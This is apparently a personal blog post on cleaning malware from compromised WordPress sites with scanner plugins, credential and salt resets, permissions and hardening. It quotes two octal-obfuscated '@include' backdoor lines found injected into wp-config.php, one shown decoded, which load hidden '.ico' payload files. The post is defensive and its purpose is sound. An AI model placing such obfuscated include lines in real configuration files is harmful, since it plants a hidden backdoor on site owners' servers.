---
title: "How to Clean a Malware Infected WordPress"
date: 2019-12-31T09:06:56-06:00
featured_image: wordpress.jpg
draft: true
---

During the past few weeks I noticed that all my Wordress sites had very slow loading times. My first thought was that I was experiencing increased traffic on one of my websites---I always see the glass half full. After inspecting my host's cpanel, I noticed that the number of processes running was at maximum limit, even though there was not enough traffic for such a thing. Could it be malware? I opened up file manager, and there it was: files that were clearly not part of the default wordpress installation, like for example `tky9gpri.php` and `i684ypcy.php`. I digged a little bit more and also found code injected in some wordpress php files, like for example `wp-config.php` where I found this piece of code near the header:
```php
/*274ce*/

@include "\057h\157m\145/\166i\143t\157r\141s\057c\150i\143a\147o\143h\151.\157r\147/\167p\055i\156c\154u\144e\163/\123i\155p\154e\120i\145/\130M\114/\056c\145b\1437\067e\146.\151c\157";

/*274ce*/
```

Pasting the above code in [UnPHP](https://www.unphp.net) outputs the following decoded output

```php
<?  /*274ce*/

@include "/home/victoras/chicagochi.org/wp-includes/SimplePie/XML/.cebc77ef.ico";

/*274ce*/ ?>
```
In other words, the attacker includes `.cebc77ef.ico`, which is also malicious.

Why did this happen though? With it's hunderds of developers and millions of users, isn't WordPress one of the most secure content management systems one could use? Yes it is, as long as you keep it updated! I had neglected keeping WordPress, the theme I am using as well as all it's plugins up-to-date, which the hackers used to gain access to my system. In fact, since I am hosting 5 websites on the same virtual server, I found out that all 5 have been compromised. Here is how I cleaned them:

## Kill suspicious processes on server
If you have terminal access inspect the running processes (`ps -Af`) and kill any you don't recognize.

### Restore .htaccess file
Restore .htaccess file to the following:

```bash
# BEGIN WordPress
# The directives (lines) between `BEGIN WordPress` and `END WordPress` are
# dynamically generated, and should only be modified via WordPress filters.
# Any changes to the directives between these markers will be overwritten.
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>

# END WordPress
```

## Clean the Woprdpress installation
Let's start cleaning WordPress from any malicious files/code. You can either do this manually (if you really know what you are doing), or through a plugin. I used [Wordfence](https://wordpress.org/plugins/wordfence/), [Sucuri](https://wordpress.org/plugins/sucuri-scanner/) and [Quttera](https://wordpress.org/plugins/quttera-web-malware-scanner/), as well as manually checking the WordPress files' integrity.

### Install Wordfence
Install and activate [Wordfence](https://wordpress.org/plugins/wordfence/) and select the Scan tab. Click Manage Scan 

{{< figure src="scan-type.jpg" size="300x" >}}

and select "High Sensitivity" as the Basic Scan Type Option.

{{< figure src="scan-type-option.jpg" >}}

Click "Back to Scan" and then start the scan by clicking the "Start New Scan" button.

{{< figure src="start-new-scan.jpg" >}}

Depending on the size of your wordpress installation and the resources of your host you might have to wait anywhere from a few minutes to a few hours. Keep this tab open, relax, and go grab a coffee.

When the scan is finished, you should see something like the screenshot below. Clearly, my website has been hacked and is full of malicious files, so let's clean it up! 

{{< figure src="scan-results.jpg" >}}

First, take a backup. Connect to cpanel, zip the folder where you have the wordpress installation and download that to your computer.

Now let's clean the mess. Click "Delete all Deletable Files" and "Repair all Repairable Files". You might notice that not all files have been fixed. Go through remaining files one by one and fix. Example: wp-config.php had this:
```php
<?php
/*6e2b3*/

@include "\057home\057vict\157ras/\162igou\166assi\141.com\057wp-i\156clud\145s/js\057crop\057.593\0626198\056ico";

/*6e2b3*/
```
which I had to manually clean. Once you are done, run the scan again to make sure eveything has been cleaned.

### Install Sucuri
Donwload, install and activate [Sucuri](https://wordpress.org/plugins/sucuri-scanner/) to check for WordPress integrity. Click Sucuri Security -> Dashboard and look for the WordPress Integrity window. Sucuri warms me that Core WordPress files were modified, however inspecting them one by one, you will see that those are the files added by the Wordfence plugin. Select both and click Mark as Fixed.

{{< figure src="sucuri-results.jpg" >}}

If you server allows the execution of system commands, I also recommend enabling the WordPress Integrity Diff Utility. Click "Review Flase Positives" and enable the "WordPress Integrity Diff Utility".

### Install Qutterra
Download, install and activate [Quttera](https://wordpress.org/plugins/quttera-web-malware-scanner/). Select Quttera -> Internal Scanner and click "Scan Now".

{{< figure src="quttera-scan.jpg" >}}

Click "Detected Threats" and inspect one by one the files and clean as necessary. You could also use "Internal Scanner - High Sensitivity", but expect more false positives.

{{< figure src="quttera-results.jpg" >}}

### Update WordPress, theme and plugins.
Update WordPress, theme and all plugins to latest versions. Delete all inactive themes and plugins. Also inspect plugins and remove any you are not using anymore.

## Final steps 
### Cleanup database
Search your WordPress database (usually MySQL) for the tag `<?php` in all the tables. If it is found, then inspect the table and delete entry or table as necessary.

### Add proper file & folder permissions
```bash
chmod -R u+rwX,go+rX,go-w /path
```

```bash
chmod 444 .htaccess
```
Beware that the above line will put .htaccess in "read-only" mode. Future plugins will fail to modify this file, so remember to temporarily chmod 644 every time a plugin needs to modify this file.

### Check users and change password
Check all users and delete any user you don't recognize. Change all passwords for all users. If you are using cpanel, also change the password there. If you are using ssh keys to login, delete all keys and generate fresh ones.

### Change DB password
Change the database user's password and update wp-config.php.

### Check all posts, comments, pages
Check all posts, comments and pages and delete any you don't recognize.

### Reset WordPress Salt & Security keys
Edit wp-config.php and look for something like the following:
```bash
/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         'random_key' );
define( 'SECURE_AUTH_KEY',  'random_key' );
define( 'LOGGED_IN_KEY',    'random_key' );
define( 'NONCE_KEY',        'random_key' );
define( 'AUTH_SALT',        'random_key' );
define( 'SECURE_AUTH_SALT', 'random_key' );
define( 'LOGGED_IN_SALT',   'random_key' );
define( 'NONCE_SALT',       'random_key' );

/**#@-*/
```

If the above lines do not exist, copy paste them in wp-config.php.
Click Sucuri Security, then Settings and finally the Post-Hack Tab.

{{< figure src="sucuri-update-secret-keys.jpg" >}}

Check the "I understand that this operation cannot be reverted" and click ""Generate New Security Keys". Copy the new keys and replace them with the ones in wp-config.php. This will invalidate all logged users and you will be forced to login again.

### Check your crontab
Either in terminal `crontab -e` or in cpanel, make sure only commands that are recognized run at specific intervals. If you are not sure, delete all entries.

## Hardening
If you have followed all of the above steps, your WordPress installation should be clean of malware and good to go. However, to prevent future hacks, these are the steps that I recommend implementing.

### Block xmlrpc
XML-RPC is a remote procedure call which uses XML over HTTP to trigger commands remotely, like for instance posting a new post. Disable it using .htaccess and the following block of code.

```bash
# BEGIN protect xmlrpc.php
<files xmlrpc.php>
order allow,deny
deny from all
</files>
# END protect xmlrpc.php
```

### Block X-XSS 
From [Sucuri](https://docs.sucuri.net/warnings/hardening/security-headers-x-xss-protection/):
> To improve the security of your site against some types of XSS (cross-site scripting) attacks, it is recommended that you add the following header to your site:
```bash
Header set X-XSS-Protection "1; mode=block"
```

### Enable Two-Factor Authentication
Go to Wordfence -> Login Secutiy and enable 2FA.

### Enable all Sucuri's Hardening options
Go to Sucuri -> Settings and select the Hardening Tab.

{{< figure src="sucuri-hardening.jpg" >}}

You should have all Hardenings enabled except for the "Website Firewall Protection", which is a paid service. Please beware that the Block PHP Files in WP-CONTENT and WP-INCLUDES Directory might break your site, if your theme is using php files in them. If that is the case, whitelist your theme's PHP files in the box below.

### Use SFTP instead of FTP
SFTP if a secure form of FTP in which all file transfers and communication (including sending the password to login) are encrypted. Unless you want your password to be sniffed, stop using FTP immediatelly and switch to SFTP.

### Change default wp-login, wp-admin
Most of the malware is run by bots that automatically try to brute-force into your wordpress installation or find a backdoor by a known exploit. Changing the default wp-login and wp-admin urls disables such attacks, as they won't your unique custom login url. [WPS Hide Login](https://wordpress.org/plugins/wps-hide-login/) can do that for you.
